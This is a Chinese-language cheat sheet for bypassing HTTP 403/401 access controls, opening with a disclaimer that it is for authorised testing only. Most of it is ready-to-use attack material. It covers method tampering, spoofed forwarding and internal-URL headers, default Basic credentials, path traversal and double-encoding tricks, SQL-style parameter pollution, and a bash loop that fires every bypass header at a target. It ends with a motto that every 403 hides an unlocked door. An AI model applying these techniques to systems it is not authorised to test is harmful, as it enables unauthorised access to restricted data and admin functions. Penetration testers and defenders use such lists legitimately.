# 403绕过速查表

> **法律声明**: 本文档仅供授权安全测试使用。未经授权对目标系统进行任何形式的绕过或测试均属违法行为。使用者须自行承担法律责任。

---

## 快速决策树

```
遇到403/401
├─ 1. Python requests 代替 curl
├─ 2. 改HTTP方法
├─ 3. 加绕过Header (15+种，全试一遍)
├─ 4. 路径编码/路径截断
├─ 5. Content-Type切换
├─ 6. 参数位置切换
├─ 7. 大小写混淆
├─ 8. URL末尾加 /、.json、? 等
└─ 9. 若都不行 → 可能真的无权限，换路子
```

---

## 一、工具切换 / TLS指纹

| # | 方法 | 命令/示例 | 说明 |
|---|------|----------|------|
| 1 | Python requests | `requests.get(url, headers=headers)` | 默认TLS指纹不同于curl，可绕过OpenResty等WAF |
| 2 | Burp Repeater | 直接发送 | 部分WAF只拦浏览器流量 |
| 3 | curl 加参数 | `curl -k --tlsv1.2` | 指定TLS版本改变指纹 |
| 4 | HTTP/2 | `curl --http2` | WAF对HTTP/2规则可能不全 |

---

## 二、HTTP方法篡改

| # | 方法 | 命令/示例 | 说明 |
|---|------|----------|------|
| 5 | POST | `-X POST` | 很多ACL只限制GET |
| 6 | PUT | `-X PUT` | 覆盖/创建资源 |
| 7 | DELETE | `-X DELETE` | 服务器对DELETE限制更少 |
| 8 | PATCH | `-X PATCH` | 部分修改可能过检 |
| 9 | OPTIONS | `-X OPTIONS` | 查询允许方法 |
| 10 | HEAD | `-X HEAD` | 仅取响应头，可能绕过 |
| 11 | CONNECT | `-X CONNECT` | 隧道方法偶尔绕过 |
| 12 | 方法覆盖Header | `-H 'X-HTTP-Method-Override: GET'` | 利用框架支持的方法覆盖 |
| 13 | 方法覆盖参数 | `?_method=GET` | 同上的参数版本 |

---

## 三、Header注入 / 伪造来源

| # | 方法 | 命令/示例 | 说明 |
|---|------|----------|------|
| 14 | X-Forwarded-For | `-H 'X-Forwarded-For: 127.0.0.1'` | 伪造来源IP为本地 |
| 15 | X-Real-IP | `-H 'X-Real-IP: 127.0.0.1'` | Nginx常用真实IP头 |
| 16 | X-Forwarded-Host | `-H 'X-Forwarded-Host: localhost'` | 伪造目标主机 |
| 17 | X-Original-URL | `-H 'X-Original-URL: /admin'` | IIS/反向代理绕过 |
| 18 | X-Rewrite-URL | `-H 'X-Rewrite-URL: /admin'` | 类似X-Original-URL |
| 19 | X-Originating-IP | `-H 'X-Originating-IP: 127.0.0.1'` | 部分代理使用 |
| 20 | X-Remote-IP | `-H 'X-Remote-IP: 127.0.0.1'` | 同上 |
| 21 | X-Client-IP | `-H 'X-Client-IP: 127.0.0.1'` | 同上 |
| 22 | X-Host | `-H 'X-Host: 127.0.0.1'` | 同上 |
| 23 | Forwarded | `-H 'Forwarded: for=127.0.0.1;host=localhost'` | RFC标准转发头 |
| 24 | X-Custom-IP-Authorization | `-H 'X-Custom-IP-Authorization: 127.0.0.1'` | 部分云服务内部头 |
| 25 | X-Auth-Token | `-H 'X-Auth-Token: null'` 或 `-H 'X-Auth-Token: admin'` | 猜内部认证Token |
| 26 | X-API-Key | `-H 'X-API-Key: admin'` 或 `-H 'X-API-Key: 1'` | 同上 |
| 27 | Authorization | `-H 'Authorization: Basic YWRtaW46YWRtaW4='` | Basic认证默认凭据 |
| 28 | Referer | `-H 'Referer: https://admin.target.com'` | 伪造来源页 |
| 29 | Origin | `-H 'Origin: https://internal.target.com'` | 伪造跨域来源 |

### 批量测试Header脚本

```bash
# 一键测试所有绕过Header
headers=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Forwarded-Host: localhost"
  "X-Original-URL: /admin"
  "X-Rewrite-URL: /admin"
  "X-Originating-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "X-Host: 127.0.0.1"
  "Forwarded: for=127.0.0.1;host=localhost"
  "X-Custom-IP-Authorization: 127.0.0.1"
  "X-Auth-Token: admin"
  "X-API-Key: admin"
  "Referer: https://admin.target.com"
  "Origin: https://internal.target.com"
)
for h in "${headers[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "$h" "$1")
  echo "$code $h"
done
```

---

## 四、路径操作

| # | 方法 | 示例 | 说明 |
|---|------|------|------|
| 30 | 双写路径 | `//admin//` | 双重斜杠可能绕过路径匹配 |
| 31 | 路径遍历 | `/admin/../user/` | 后退目录绕过 |
| 32 | 编码绕过 | `%2e%2e%2f` → `../` | URL编码 |
| 33 | 二次编码 | `%252e%252e%252f` | WAF解码一次，服务器解码第二次 |
| 34 | Unicode编码 | `..%c0%af` | IIS Unicode解析绕过 |
| 35 | 末尾加特殊字符 | `/admin%00` | 空字节截断 |
| 36 | 末尾加./ | `/admin/.` | 路径规范化差异 |
| 37 | 末尾分号 | `/admin;/` | Tomcat等解析差异 |
| 38 | 末尾反斜杠 | `/admin\\` | Windows路径解析 |
| 39 | 末尾加? | `/admin?` | 参数化解析绕过 |
| 40 | 末尾加# | `/admin#` | Fragment忽略 |
| 41 | 末尾加.json | `/admin/index.json` | REST API扩展名绕过 |
| 42 | 路径参数 | `/admin;foo=bar` | 矩阵参数绕过 |
| 43 | 大小写混淆 | `/AdMiN` | Windows/Linux大小写敏感差异 |
| 44 | 使用IP代替域名 | `http://127.0.0.1/admin` | 绕过基于Host的ACL |

---

## 五、Content-Type / 参数操作

| # | 方法 | 示例 | 说明 |
|---|------|------|------|
| 45 | 切换Content-Type | `application/json` / `application/xml` / `text/plain` | 不同解析器规则不同 |
| 46 | 参数位置切换 | `POST /admin` vs `GET /admin?param=1` | Query→Body→Header切换 |
| 47 | 重复参数 | `?id=1&id=2` | 服务器取第一个，WAF取后者 |
| 48 | 参数污染 | `?id=1&id=union+select+1` | HPP攻击 |
| 49 | 添加额外的参数 | `?valid=1&admin=true` | 猜内部参数名 |
| 50 | JSON参数混淆 | `{"id":1,"role":"admin"}` | 尝试提权参数 |

---

## 六、其他绕过技巧

| # | 方法 | 示例 | 说明 |
|---|------|------|------|
| 51 | 修改User-Agent | `-H 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1;)'` | 模拟搜索引擎爬虫 |
| 52 | 修改Accept-Language | `-H 'Accept-Language: zh-CN,zh;q=0.9'` | 触发不同策略 |
| 53 | 使用IPv6 | `http://[::1]/admin` | IPv6 ACL可能不完善 |
| 54 | 修改Host头 | `-H 'Host: admin.target.com'` | 直接访问内部域名 |
| 55 | 使用短链接/跳转 | 通过302跳转间接访问 | 绕过URL白名单 |
| 56 | WebSocket协议 | `ws://target.com/admin` | WS/WS协议规则缺失 |

---

## 七、遇到403时的完整检查清单

- [ ] 用Python requests 而不是 curl
- [ ] 切换HTTP方法 (GET→POST→PUT→DELETE→PATCH→OPTIONS→HEAD)
- [ ] 加 `X-Forwarded-For: 127.0.0.1`
- [ ] 加 `X-Real-IP: 127.0.0.1`
- [ ] 加 `X-Original-URL: /admin`
- [ ] 加 `X-Rewrite-URL: /admin`
- [ ] 加 `X-Custom-IP-Authorization: 127.0.0.1`
- [ ] 加 `X-Auth-Token: admin`
- [ ] 加 `Referer: https://admin.target.com`
- [ ] 加 `Forwarded: for=127.0.0.1;host=localhost`
- [ ] 路径双写: `//admin//`
- [ ] 路径遍历: `/admin/../`
- [ ] URL编码: `%2e%2e%2f`
- [ ] 末尾加特殊字符: `?`, `#`, `/`, `.`, `;`
- [ ] 切换Content-Type
- [ ] 参数位置切换
- [ ] 大小写混淆
- [ ] 修改User-Agent为Googlebot
- [ ] 改用IP直连
- [ ] 改用IPv6

---

> **核心心法**: 403 ≠ 拒绝，403 = 还没找到对的方式。每个403背后都藏着一扇没锁上的门。
